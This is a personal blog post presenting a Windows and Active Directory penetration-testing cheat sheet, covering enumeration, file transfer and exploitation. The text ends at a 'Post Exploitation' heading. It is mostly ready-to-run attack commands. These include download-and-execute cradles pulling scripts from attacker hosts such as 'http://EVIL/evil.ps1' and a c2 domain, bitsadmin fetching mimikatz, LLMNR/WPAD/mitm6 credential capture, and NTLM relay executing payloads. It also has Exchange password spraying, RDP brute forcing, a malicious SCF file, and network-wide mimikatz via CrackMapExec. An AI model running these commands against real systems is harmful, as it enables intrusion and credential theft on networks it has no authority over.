---
layout: post
title:  "Parameter Cheat Sheet"
date:   2021-10-05 22:03:38 +0830
categories: Windows PrivEsc Exploit Cheatsheet
description: A place for me to store my notes/tricks for Windows Based Systems.
thumbnail: https://upload.wikimedia.org/wikipedia/commons/5/5f/Windows_logo_-_2012.svg
---

A place for me to store my notes/tricks for Windows Based Systems. 


# Table of Contents:
   - <a href="#enumeration">Enumeration</a>
      - <a href="#-basics">Basics</a>
      - <a href="#-users-with-spn">Users with SPN</a>
      - <a href="#-kerberos-enumeration">Kerberos Enumeration</a>
      - <a href="#-red-team-csharp-scripts">Red-Team CSharp Scripts</a>
      - <a href="#-active-directory">Active Directory</a>
      - <a href ="#ad-enumeration-from-linux-box---ad-tool">AD Enumeration from Linux Box - AD Tool</a>
      - <a href="#-sharpview-enumeration">SharpView Enumeration</a>
      - <a href="#-smb-enumeration">SMB Enumeration</a>
      - <a href="#-snmp-enumeration">SNMP Enumeration</a>
      - <a href="#-mysql-enumeration">MySQL Enumeration</a>
      - <a href="#-dns-zone-transfer">DNS Zone Transfer</a>
      - <a href="#-ldap">LDAP</a>
      - <a href="#-rpc-enumeration">RPC Enumeration</a>
      - <a href="#-remote-desktop">Remote Desktop</a>
   - <a href="#file-transfer">File Transfer</a>
      - <a href="#-tftp">TFTP</a>
      - <a href="#-ftp">FTP</a>
      - <a href="#-vbs-script">VBS Script</a>
      - <a href="#-powershell">Powershell</a>
      - <a href="#-powershell-base64">Powershell Base64</a>
      - <a href="#-secure-copy--pscpexe">Secure Copy / pscp.exe</a>
      - <a href="#-bitsadminexe">BitsAdmin.exe</a>
      - <a href="#remote-desktop">Remote Desktop</a>
      - <a href="#-winhttp-com-object">WinHTTP Com Object</a>
      - <a href="#-certutil">CertUtil</a>
      - <a href="#curl-windows-1803">Curl (Windows 1803 )</a>
      - <a href="#-smb">SMB</a>
   - <a href="#exploit">Exploit</a>
      - <a href="#-llmnr--nbt-ns-spoofing">LLMNR / NBT-NS Spoofing</a>
      - <a href="#-responder-wpad-attack">Responder WPAD Attack</a>
      - <a href="#-mitm6">mitm6</a>
      - <a href="#-scf-file-attack">SCF File Attack</a>
      - <a href="#-ntlm-relay">NTLM-Relay</a>
      - <a href="#-priv-exchange">Priv Exchange</a>
      - <a href="#-exchange-password-spray">Exchange Password Spray</a>
      - <a href="#-exchangerelayx">ExchangeRelayX</a>
      - <a href="#-exchange-mailbox-post-compromise">Exchange Mailbox Post-Compromise</a>
      - <a href="#-crackmapexec">CrackMapExec</a>
      - <a href="#-mail-sniper">Mail Sniper</a>
      - <a href="#-read-exchange-emails-with-powershell">Read Exchange Emails with PowerShell</a>
      - <a href="#-kerberos-stuff">Kerberos Stuff</a>
      - <a href="#-mssql-exploiting-powerupsql">MSSQL Exploiting (PowerUpSQL)</a>
      - <a href="#-malicious-macro-with-msbuild">Malicious Macro with MSBuild</a>
      - <a href="#-weirdhta---undetectable-hta">WeirdHTA - Undetectable HTA</a>
      - <a href="#-evilwinrm">EvilWinRM</a>
      - <a href="#-GetVulnerableGPO">GetVulnerableGPO</a>
      - <a href="#-invoke-psimage">Invoke-PSImage</a>
      - <a href="#-meterpreter--donut---shellcode-injection-net">Meterpreter + Donut - Shellcode Injection .NET</a>
      - <a href="#">DemiGuise - Encrypted HTA</a>
      - <a href="#-grouper2">Grouper2 - Find Vuln GPO's</a>
   - <a href="#privilege-escalation">Privilege Escalation</a>
      - <a href="#-basics-1">Basics</a>
      - <a href="#-powerupps1-sometimes-a-quick-win">PowerUp.ps1 (Sometimes a Quick Win)</a>
      - <a href="#-sharpup">SharpUp</a>
      - <a href="#-if-its-ad-get-bloodhound-imported">If It's AD Get Bloodhound Imported...</a>
      - <a href="#-bloodhound-python">Bloodhound-Python</a>
      - <a href="#-cleartext-passwords">Cleartext Passwords</a>
      - <a href="#-view-installed-software">View Installed Software</a>
      - <a href="#-weak-folder-permissions">Weak Folder Permissions</a>
      - <a href="#-scheduled-tasks">Scheduled Tasks</a>
      - <a href="#-powershell-history">Powershell History</a>
      - <a href="#-view-connected-drives">View Connected Drives</a>
      - <a href="#-view-privs">View Privs</a>
      - <a href="#-is-anyone-else-logged-in">Is Anyone Else Logged In?</a>
      - <a href="#-view-registry-auto-login">View Registry Auto-Login</a>
      - <a href="#-view-stored-creds-in-credential-manager">View Stored Creds in Credential Manager</a>
      - <a href="#-view-unquoted-service-paths">View Unquoted Service Paths</a>
      - <a href="#-view-startup-items">View Startup Items</a>
      - <a href="#-check-for-alwaysinstalledelevated-reg-key">Check for AlwaysInstalledElevated Reg Key</a>
      - <a href="#-any-passwords-in-registry">Any Passwords in Registry?</a>
      - <a href="#-any-sysrep-or-unattend-files-left-over">Any Sysrep or Unattend Files Left Over</a>
      - <a href="#-gpp-group-policy-preferences-passwords">GPP (Group Policy Preferences) Passwords</a>
      - <a href="#-dump-chrome-passwords-also-post-exploit">Dump Chrome Passwords (Also Post Exploit)</a>
      - <a href="#-dump-keepass">Dump KeePass</a>
      - <a href="#token-impersonation">Token Impersonation</a>
      - <a href="#-juicy-potato">Juicy Potato</a>
      - <a href="#-kerberoasting">Kerberoasting</a>
      - <a href="#-kerberoast-with-python">Kerberoast with Python</a>
      - <a href="#-as-rep-roasting">AS Rep Roasting</a>
      - <a href="#-dcsync-also-post-exploit">DCSync (Also Post Exploit)</a>
   - <a href="#post-exploitation">Post Exploitation</a>
      - <a href="#-useful-commands">Useful Commands</a>
      - <a href="#-check-if-powershell-logging-is-enabled">Check if Powershell Logging is Enabled</a>
      - <a href="#-esenutlexe-dump-locked-file">Esenutl.exe Dump Locked File</a>
      - <a href="#-run-seatbelt-absolutely-must">Run Seatbelt (ABSOLUTELY MUST)</a>
      - <a href="#-dump-creds">Dump Creds</a>
      - <a href="#-dump-creds-2">Dump Creds #2</a>
      - <a href="#-dump-creds-2">Dump SAM Remotely over WinRM</a>
      - <a href="#-running-mimikatz-with-gadgettojscript-or-vbs">Running MimiKatz with JScript or VBS</a>
      - <a href="#-sessiongopher">SessionGohper</a>
      - <a href="#-dump-chrome-passwords-also-post-exploit-1">Dump Chrome Passwords (Also Post Exploit)</a>
      - <a href="#-dump-process-memory-w-mimikittenz">Dump Process Memory w/ Mimikittenz</a>
      - <a href="#-dump-keepass-1">Dump KeePass</a>
      - <a href="#-pypykatz">pypykatz</a>
      - <a href="#-safetykatz">SafetyKatz</a>
      - <a href="#-sharpdpapi">SharpDPAPI</a>
      - <a href="#-sharpsniper">SharpSniper</a>
      - <a href="#-sharplocker">SharpLocker</a>
      - <a href="#-check-for-missing-kbs">Check for Missing KB's</a>
      - <a href="#-decrypt-efs-files-with-mimikatz-if-adminsystem">Decrypt EFS Files with Mimikatz if Admin/System</a>
      - <a href="#-uac-bypass">UAC Bypass</a>
      - <a href="#-golden-ticket-attack">Golden Ticket Attack</a>
      - <a href="#-dcsync--golden-ticket-in-one">DCSync & Golden Ticket in One</a>
      - <a href="#-child-domain-to-forest-compromise">Child Domain to Forest Compromise</a>
      - <a href="#-dump-ntdsdit">Dump NTDS.dit</a>
      - <a href="#-sebackupprivlege---dump-ntdsdit">SeBackupPrivlege - Dump NTDS.dit</a>
   - <a href="#persistance">Persistance</a>
      - <a href="#-ssh-shuttle">SSH Shuttle</a>
      - <a href="#-sharpdoor">SharpDoor - RDP Multi Session</a>
      - <a href="#-autorun-registry">AutoRun Registry</a>
      - <a href="#-sharpersist">SharPersist</a>
      - <a href="#-run--run-once">Run &amp; Run Once</a>
      - <a href="#-scheduled-tasks-1">Scheduled Tasks</a>
      - <a href="#-windows-startup-folder">Windows Startup Folder</a>
      - <a href="#-exedll-hijacking">EXE/DLL Hijacking</a>
      - <a href="#-add-user-account">Add User Account</a>
      - <a href="#-persistence-with-kerberos">Persistence with Kerberos</a>
   - <a href="#lateral-movement">Lateral Movement</a>
      - <a href="#-plink">Plink</a>
      - <a href="#-powershell-port-forward">Powershell Port Forward</a>
      - <a href="#-invoke-socks-proxy">Invoke Socks Proxy</a>
      - <a href="#-socat-for-windows">Socat for Windows</a>
      - <a href="#-sharpexec">SharpExec</a>
      - <a href="#-secure-sockets-funneling">Secure Sockets Funneling</a>
      - <a href="#-chisel-fast-tcp-tunnel-over-http-secured-by-ssh">Chisel (Fast TCP Tunnel over HTTP secured by SSH)</a>
      - <a href="#-crackmapexec-1">CrackMapExec</a>
      - <a href="#-wmic-spawn-process">WMIC Spawn Process</a>
      - <a href="#-winrs">WinRS</a>
      - <a href="#-invoke-wmiexecps1">Invoke-WMIExec.ps1</a>
      - <a href="#-powershell-invoke-command-requires-port-5985">Powershell Invoke-Command (Requires Port 5985)</a>
      - <a href="#-psexec">PSExec</a>
      - <a href="#-powershell-remoting">Powershell Remoting</a>
      - <a href="#-configure-remote-service-over-smb-requires-local-admin-on-target-machine">Configure Remote Service over SMB (Requires Local Admin on Target Machine)</a>
      - <a href="#-pass-the-hash">Pass-The-Hash</a>
      - <a href="#-pass-the-ticket">Pass-The-Ticket</a>
   - <a href="#obfuscation--evasion-techniques">Obfuscation / Evasion Techniques</a>
      - <a href="#-invoke-obfusaction">Invoke-Obfusaction</a>
      - <a href="#-invoke-cradlecraft">Invoke-CradleCraft</a>
      - <a href="#-invoke-dosfuscation">Invoke-DOSfuscation</a>
      - <a href="#-unicorn">Unicorn</a>
   - <a href="#applocker--constrained-mode-bypasses">AppLocker / Constrained Mode Bypasses</a>
      - <a href="#-verify-is-you-are-in-constrained-mode">Verify is you are in constrained mode</a>
      - <a href="#-powershellveryless-bypass">PowershellVeryLess Bypass</a>
      - <a href="#-world-writable-folders-by-default-on-windows-10-1803">World Writable Folders (By Default on Windows 10 1803)</a>
      - <a href="#-downgrade-attack">Downgrade Attack</a>
      - <a href="#-applocker-cor-profile-bypass">AppLocker COR Profile Bypass</a>
      - <a href="#msbuild-powershellcmd-bypass">MSBuild Powershell/CMD Bypass</a>
      - <a href="#-psattack">PSAttack</a>
      - <a href="#-nopowershell">NoPowerShell</a>
      - <a href="#-rundll32--bypass">runDLL32  Bypass</a>
      - <a href="#-psbypassclm">PSByPassCLM</a>

'Note': These notes are heavily based off other articles, cheat sheets and guides etc. I just wanted a central place to store the best ones.


The best Active Directory resource out there -> https://zer1t0.gitlab.io/posts/attacking_ad/


## [](#header-2)ENUMERATION

#### [](#header-4) Basics
```powershell
net users
net users /domain
net localgroup
net groups /domain
net groups /domain "Domain Admins"

Get-ADUser
Get-Domain
Get-DomainUser
Get-DomainGroup
Get-DomainGroupMember -identity "Domain Admins" -Domain m0chanAD.local -DomainController 10.10.14.10
Find-DomainShare


#Host Discovery
netdiscover -r subnet/24
nbtscan -r [range]
for /L %i in (1,1,255) do  @ping.exe -n 1 -w 50 <10.10.10>.%i | findstr TTL


#Reverse DNS Lookup
$ComputerIPAddress = "10.10.14.14"
[System.Net.Dns]::GetHostEntry($ComputerIPAddress).HostName
```

https://github.com/tevora-threat/SharpView

#### [](#header-4) Users with SPN

```powershell
Get-DomainUser -SPN

Get-ADComputer -filter {ServicePrincipalName -like <keyword>} -Properties OperatingSystem,OperatingSystemVersion,OperatingSystemServicePack,
PasswordLastSet,LastLogonDate,ServicePrincipalName,TrustedForDelegation,TrustedtoAuthForDelegation
```



#### [](#header-4) Kerberos Enumeration

```powershell
nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test'
```


#### [](#header-4) Red-Team CSharp Scripts

```powershell
#https://github.com/Mr-Un1k0d3r/RedTeamCSharpScripts

LDAPUtility.cs

Usage: ldaputility.exe options domain [arguments]

ldaputility.exe DumpAllUsers m0chan
ldaputility.exe DumpUser m0chan mr.un1k0d3r
ldaputility.exe DumpUsersEmail m0chan
ldaputility.exe DumpAllComputers m0chan 
ldaputility.exe DumpComputer m0chan DC01
ldaputility.exe DumpAllGroups m0chan
ldaputility.exe DumpGroup m0chan "Domain Admins"
ldaputility.exe DumpPasswordPolicy m0chan

Also WMIUtility.cs for WMI Calls & LDAPQuery.cs for Raw LDAP Queries.

See github linked above for full details.

```


#### [](#header-4) Active Directory

```powershell
nltest /DCLIST:DomainName
nltest /DCNAME:DomainName
nltest /DSGETDC:DomainName

# Get Current Domain Info - Similar to Get-Domain
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# Get Domain Trust Info - Similar to Get-DomainTrust
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

# View Domain Info
[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()

#  View Domain Trust Information
([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', 'forest-of-interest.local')))).GetAllTrustRelationships()

nltest [server:<fqdn_foreign_domain>] /domain_trusts /all_trusts /v

nltest /dsgetfti:<domain>

nltest /server:<ip_dc> /domain_trusts /all_trusts

([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

# View All Domain Controllers
nltest /dclist:offense.local
net group "domain controllers" /domain

# View DC for Current Session
nltest /dsgetdc:m0chanAD.local

# View Domain Trusts from CMD
nltest /domain_trusts

# View User Info from CMD
nltest /user:"m0chan"

# get domain name and DC the user authenticated to
klist

# Get All Logged on Sessions, Includes NTLM & Kerberos
klist sessions

# View Kerb Tickets
klist

# View Cached Krbtgt
klist tgt

# whoami on older Windows systems
set u

#List all Usernames
([adsisearcher]"(&(objectClass=User)(samaccountname=-))").FindAll().Properties.samaccountname

#List Administrators

([adsisearcher]"(&(objectClass=User)(admincount=1))").FindAll().Properties.samaccountname

#List all Info about Specific User

([adsisearcher]"(&(objectClass=User)(samaccountname=<username>))").FindAll().Properties

#View All Users with Description Field Set

([adsisearcher]"(&(objectClass=group)(samaccountname=-))").FindAll().Properties | % { Write-Host $_.samaccountname : $_.description }
```





#### AD Enumeration from Linux Box - AD Tool

```powershell
#https://github.com/jasonwbarnett/linux-adtool

tar zxvf adtools-1.x.tar.gz
cd adtools-1.x
./configure
make
make install

> adtool list ou=user,dc=example,dc=com
CN=allusers,OU=user,DC=example,DC=com
OU=finance,OU=user,DC=example,DC=com
OU=administration,OU=user,DC=example,DC=com

> adtool oucreate marketing ou=user,dc=example,dc=com
> adtool useradd jsmith ou=marketing,ou=user,dc=example,dc=com
> adtool setpass jsmith banana
> adtool unlock jsmith
> adtool groupadd allusers jsmith
> adtool attributereplace jsmith telephonenumber 123
> adtool attributereplace jsmith mail jsmith@example.com
```





#### [](#header-4) SharpView Enumeration

```powershell
#https://github.com/tevora-threat/SharpView

Get-DomainFileServer
Get-DomainGPOUserLocalGroupMapping
Find-GPOLocation
Get-DomainGPOComputerLocalGroupMapping
Find-GPOComputerAdmin
Get-DomainObjectAcl
Get-ObjectAcl
Add-DomainObjectAcl
Add-ObjectAcl
Remove-DomainObjectAcl
Get-RegLoggedOn
Get-LoggedOnLocal
Get-NetRDPSession
Test-AdminAccess
Invoke-CheckLocalAdminAccess
Get-WMIProcess
Get-NetProcess
Get-WMIRegProxy
Get-Proxy
Get-WMIRegLastLoggedOn
Get-LastLoggedOn
Get-WMIRegCachedRDPConnection
Get-CachedRDPConnection
Get-WMIRegMountedDrive
Get-RegistryMountedDrive
Find-InterestingDomainAcl
Invoke-ACLScanner
Get-NetShare
Get-NetLoggedon
```



#### [](#header-4) SMB Enumeration

```powershell
nmap -p 139,445 --script smb.nse,smb-enum-shares,smbls
enum4linux 1.3.3.7
smbmap -H 1.3.3.7
smbclient -L \\INSERTIPADDRESS
smbclient -L INSERTIPADDRESS
smbclient //INSERTIPADDRESS/tmp
smbclient \\\\INSERTIPADDRESS\\ipc$ -U john
smbclient //INSERTIPADDRESS/ipc$ -U john
smbclient //INSERTIPADDRESS/admin$ -U john
nbtscan [SUBNET]


#Check for SMB Signing
nmap --script smb-security-mode.nse -p 445 10.10.14.14 
```



#### [](#header-4) SNMP Enumeration

```powershell
snmpwalk -c public -v1 10.10.14.14
snmpcheck -t 10.10.14.14 -c public
onesixtyone -c names -i hosts
nmap -sT -p 161 10.10.14.14 -oG snmp_results.txt
snmpenum -t 10.10.14.14
```



#### [](#header-4) MySQL Enumeration

```powershell
nmap -sV -Pn -vv  10.0.0.1 -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122
```



#### [](#header-4) DNS Zone Transfer

```powershell
dig axfr blah.com @ns1.m0chan.com
nslookup -> set type=any -> ls -d m0chan.com
dnsrecon -d m0chan -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml
```



#### [](#header-4) LDAP

```
ldapsearch -H ldap://<ip>
ldapwhoami
```



#### [](#header-4) RPC Enumeration

```powershell
rpcclient -U "10.10.14.14"
srvinfo
enumdomusers
enumalsgroups domain
lookupnames administrators
querydominfo
enumdomusers
queryuser <user>
lsaquery
lookupnames Guest
lookupnames Administrator
```

#### [](#header-4) Remote Desktop

```powershell
rdesktop -u guest -p guest INSERTIPADDRESS -g 94%

# Brute force
ncrack -vv --user Administrator -P /root/oscp/passwords.txt rdp://INSERTIPADDRESS
```



## [](#header-2)File Transfer



#### [](#header-4) TFTP

```powershell
m0chan Machine
mkdir tftp
atftpd --deamon --port 69 tftp
cp -file- tftp
On victim machine:
tftp -i <[IP]> GET <[FILE]>
```



#### [](#header-4) FTP

```powershell
echo open <[IP]> 21 > ftp.txt
echo USER demo >> ftp.txt
echo ftp >> ftp.txt
echo bin >> ftp.txt
echo GET nc.exe >> ftp.txt
echo bye >> ftp.txt
ftp -v -n -s:ftp.txt
```



#### [](#header-4) VBS Script

```powershell
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs



cscript wget.vbs <url> <out_file>

Use echoup function on pentest.ws to generate echo commands.
https://pentest.ws/features
```



#### [](#header-4) Powershell

```powershell
#https://github.com/danielbohannon/Invoke-CradleCrafter Use this to craft obsufacted cradles

Invoke-WebRequest "https://server/filename" -OutFile "C:\Windows\Temp\filename"

(New-Object System.Net.WebClient).DownloadFile("https://server/filename", "C:\Windows\Temp\filename") 

#Powershell Download to Memory

IEX(New-Object Net.WebClient).downloadString('http://server/script.ps1')

#Powershell with Proxy

$browser = New-Object System.Net.WebClient;
$browser.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
IEX($browser.DownloadString('https://server/script.ps1'));
```



#### [](#header-4) Powershell Base64

```powershell
$fileName = "Passwords.kdbx"
$fileContent = get-content $fileName
$fileContentBytes = [System.Text.Encoding]::UTF8.GetBytes($fileContent)
$fileContentEncoded = [System.Convert]::ToBase64String($fileContentBytes)
$fileContentEncoded | set-content ($fileName + ".b64")
```



#### [](#header-4) Secure Copy / pscp.exe

```
pscp.exe C:\Users\Public\m0chan.txt user@target:/tmp/m0chan.txt
pscp.exe user@target:/home/user/m0chan.txt C:\Users\Public\m0chan.txt
```



#### [](#header-4) BitsAdmin.exe

```
cmd.exe /c "bitsadmin.exe /transfer downld_job /download /priority high http://c2.m0chan.com C:\Temp\mimikatz.exe & start C:\Temp\binary.exe"
```



#### [](#header-4)Remote Desktop

```
rdesktop 10.10.10.10 -r disk:linux='/home/user/filetransferout'
```



#### [](#header-4) WinHTTP Com Object

```
[System.Net.WebRequest]::DefaultWebProxy
[System.Net.CredentialCache]::DefaultNetworkCredentials
$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://EVIL/evil.ps1',$false);$h.send();iex $h.responseText
```



#### [](#header-4) CertUtil

```powershell
#File Transfer

certutil.exe -urlcache -split -f https://m0chan:8888/filename outputfilename

#CertUtil Base64 Transfers

certutil.exe -encode inputFileName encodedOutputFileName
certutil.exe -decode encodedInputFileName decodedOutputFileName
```



#### [](#header-4)Curl (Windows 1803+)

```powershell
curl http://server/file -o file
curl http://server/file.bat | cmd

IEX(curl http://server/script.ps1);Invoke-Blah
```



#### [](#header-4) SMB

```powershell
python smbserver.py Share `pwd` -u m0chan -p m0chan --smb-2support
```



## [](#header-2)Exploit


#### Code Execution with MSHTA

```powershell

mshta.exe is a default binary shipped on all versions of Windows which allows the execution of .hta payloads

mshta.exe https://m0chan.com/exploit.hta

```


#### [](#header-4) LLMNR / NBT-NS Spoofing

```powershell
#Responder to Steal Creds

git clone https://github.com/SpiderLabs/Responder.git python Responder.py -i local-ip -I eth0


LLMNR and NBT-NS is usually on by default and there purpose is to act as a fallback to DNS. i/e if you search \\HRServer\ but it dosent exist, Windows (by default) will send out a LLMNR broadcast across the network. By using Responder we can respond to these broadcasts and say something like

'Yeah I'm HRServer, authenticate to me and I will get a NTLMv2 hash which I can crack or relay. More on relaying below'
```



#### [](#header-4) Responder WPAD Attack

```powershell
responder -I eth0 wpad

By default, Windows is configured to search for a Web Proxy Auto-Discovery file when using the internet

Go to internet explorer and search for Google which automatically searches for a WPAD file... 

Then take NTLMv2 hash and NTLM Relay it or send to cracking rig. 
```



#### [](#header-4) mitm6

```powershell
#Use when WPAD attack is not working, this uses IPv6 and DNS to relay creds to a target. 

By default IPV6 should be enabled. 
git clone https://github.com/fox-it/mitm6.git 
cd /opt/tools/mitm6
pip install .

mitm6 -d m0chanAD.local

Now the vuln occurs, Windows prefers IPV6 over IPv4 meaning DNS = controlled by attacker. 

ntlmrelayx.py -wh webserverhostingwpad:80 -t smb://TARGETIP/ -i

-i opens an interactive shell.

Shout out to hausec for this super nice tip.

```



#### [](#header-4) SCF File Attack

```powershell
Create .scf file and drop inside SMB Share and fire up Responder ;) 


Filename = @m0chan.scf

[Shell]
Command=2
IconFile=\\10.10.14.2\Share\test.ico
[Taskbar]
Command=ToggleDesktop
```



#### [](#header-4) NTLM-Relay

```powershell
Good article explaining differences between NTLM/Net-NTLMV1&V2

https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html

TL;DR NTLMv1/v2 is a shorthand for Net-NTLMv1/v2 and hence are the same thing.

You CAN perform Pass-The-Hash attacks with NTLM hashes.
You CANNOT perform Pass-The-Hash attacks with Net-NTLM hashes.

PS: You CANNOT relay a hash back to itself.
PS: SMB Signing must be disabled to mitigate this, you can check with nmap scan or crackmapexec

crackmapexec smb 10.10.14.0/24 --gene-relay-list targets.txt

This will tell you a list of hosts within a subnet which do not have SMB Signing enabled.

python Responder.py -I <interface> -r -d -w
ntlmrelayx.py -tf targets.txt (By default this will dump the local SAM of the targets, not very useful?)

How about we execute a command instead.

ntlmrelayx.py -tf targets.txt -c powershell.exe -Enc asdasdasdasd
ntlmrelayx.py -tf targets.txt -c powershell.exe /c download and execute beacon... = RIP
```



#### [](#header-4) Priv Exchange

```powershell
#https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/

Combine privxchange.py and ntlmrelayx

ntlmrelayx.py -t ldap://DOMAINCONTROLLER.m0chanAD.local --escalate-user TARGETUSERTOESCALATE

python privexchange.py -ah FDQN.m0chanAD.local DOMAINCONTROLLER.m0chanAD.local -u TARGETUSERTOESCALATE -d m0chanAD.local

```



#### [](#header-4) Exchange Password Spray

```powershell
#https://github.com/dafthack/MailSniper.git

Invoke-PasswordSprayOWA -ExchHostname EXCH2012.m0chanAD.local -UserList .\users.txt -Password Winter2019


#https://github.com/sensepost/ruler

./ruler-linux64 -domain mc0hanAD.local --insecure brute --userpass userpass.txt -v

```



#### [](#header-4) ExchangeRelayX 

```powershell
#https://github.com/quickbreach/ExchangeRelayX

An NTLM relay tool to the EWS endpoint for on-premise exchange servers. Provides an OWA for hackers.


./exchangeRelayx.py -t https://mail.quickbreach.com

```



#### [](#header-4) Exchange Mailbox Post-Compromise

```powershell
#https://github.com/dafthack/MailSniper.git

Enumerate GlobalAddressList

Get-GlobalAddressList -ExchHostname EXCH2012.m0chanAD.local -Username jamie@m0chanAD.local -Password Winter2019

Enumerate AD Usernames

Get-ADUsernameFromEWS -Emaillist .\users.txt

Enumerate Mailbox Folders

Get-MailboxFolders -Mailbox jamie@m0chanAD.local

Enumerate Passwords & Credentials Stored in Emails

Invoke-SelfSearch -Mailbox jamie@m0chanAD.local

Enumerate Passwords & Credentials (Any Users) Requires DA or Exchange Admin

Invoke-GlobalMailSearch -ImpersonationAccount helenHR -ExchHostname Exch2012
```



#### [](#header-4) CrackMapExec

```powershell
CrackMapExec is installed on Kali or get Windows Binary from Github.

Has 3 Execution Methods
crackmapexec smb <- Creating and Running a Service over SMB
crackmapexec wmi <- Executes command over WMI
crackmapexec at <- Schedules Task with Task Scheduler

Can execute plain commands with -X flag i/e 

crcakmapexec smb 10.10.14.0/24 -x whoami

crcakmapexec smb 10.10.14.0/24 <- Host Discovery
crackmapexec smb 10.10.14.0/24 -u user -p 'Password' 
crackmapexec smb 10.10.14.0/24 -u user -p 'Password' --pass-pol
crackmapexec smb 10.10.14.0/24 -u user -p 'Password' --shares


Can also PTH with CME

crackmapexec smb 10.10.14.0/24 -u user -H e8bcd502fbbdcd9379305dca15f4854e

cme smb 10.8.14.14 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:e8bcd502fbbdcd9379305dca15f4854e --local-auth --shares 


--local-auth is for Authenticating with Local Admin, good if Organisaton uses same local admin hash through network and not using LAPS

Dump Local SAM hashes

crackmapexec smb 10.10.14.0/24 -u user -p 'Password' --local-auth --sam

Running Mimikatz 

crackmapexec smb 10.10.14.0/24 -u user -p 'Password' --local-auth -M mimikatz

^ Very noisy but yes you can run mimikatz across a WHOLE network range. RIP Domain Admin

Enum AV Products

crackmapexec smb 10.10.14.0/24 -u user -p 'Password' --local-auth -M enum_avproducts
```



#### [](#header-4) Mail Sniper

```powershell
Invoke-PasswordSprayOWA -ExchHostname m0chanAD.local -userlist harvestedUsers.txt -password Summer2019

[-] Now spraying the OWA portal at https://m0chanAD.local/owa/

[-] SUCCESS! User:m0chan:Summer2019

Lmao, you really think Id use the pass Summer2019?
```




```



## [](#header-2)Post Exploitation
